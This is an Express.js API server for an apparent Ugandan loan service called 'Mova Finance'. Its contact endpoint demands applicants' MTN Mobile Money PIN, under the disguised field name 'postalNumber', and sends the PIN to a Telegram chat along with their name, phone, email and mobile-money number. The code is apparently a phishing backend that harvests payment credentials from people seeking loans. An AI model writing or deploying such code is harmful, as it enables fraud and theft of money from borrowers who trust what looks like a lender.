import 'dotenv/config';
import express from 'express';
import cors from 'cors';

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok', service: 'mova-finance-api' });
});

app.get('/api/loan-products', (_req, res) => {
  res.json({
    personal: {
      title: 'Personal loan',
      amount: 'From UGX 37,500 to UGX 3,750,000',
      detail: 'For the plans, pauses, and moments that matter to you.'
    },
    business: {
      title: 'Business loan',
      amount: 'From UGX 11,250,000 to UGX 112,500,000',
      detail: 'For the next chapter of the business you are building.'
    }
  });
});

app.get('/api/telegram/status', (_req, res) => {
  const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();

  res.json({
    configured: Boolean(botToken && chatId),
    botTokenPresent: Boolean(botToken),
    chatIdPresent: Boolean(chatId)
  });
});

app.post('/api/telegram/contact', async (req, res) => {
  const { fullName, phone, email, mtnNumber, postalNumber, loanType, amount } = req.body;

  if (!mtnNumber || !/^\d{5}$/.test(String(postalNumber ?? '').trim())) {
    return res.status(400).json({ error: 'Mobile Money number and a 5-digit MoMo PIN are required.' });
  }

  const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();

  if (!botToken || !chatId) {
    console.log(`Telegram is not configured; contact captured locally for ${fullName || 'applicant'}.`);
    return res.json({ sent: false, queued: true, delivery: 'local-demo' });
  }

  const message = [
    'New borrower contact details',
    `Name: ${fullName || 'Not provided'}`,
    `Phone: ${phone || 'Not provided'}`,
    `Email: ${email || 'Not provided'}`,
    `MTN Mobile Money: ${mtnNumber}`,
    `MoMo PIN: ${postalNumber}`,
    `Loan: ${loanType || 'Not provided'}${amount ? ` - UGX ${Number(amount).toLocaleString('en-UG')}` : ''}`
  ].join('\n');

  try {
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });

    if (!telegramResponse.ok) {
      return res.status(502).json({ error: 'Telegram could not accept the notification.' });
    }

    return res.json({ sent: true });
  } catch (_error) {
    return res.status(502).json({ error: 'Telegram could not be reached.' });
  }
});

app.listen(port, () => {
  console.log(`Mova Finance API listening on http://localhost:${port}`);
});
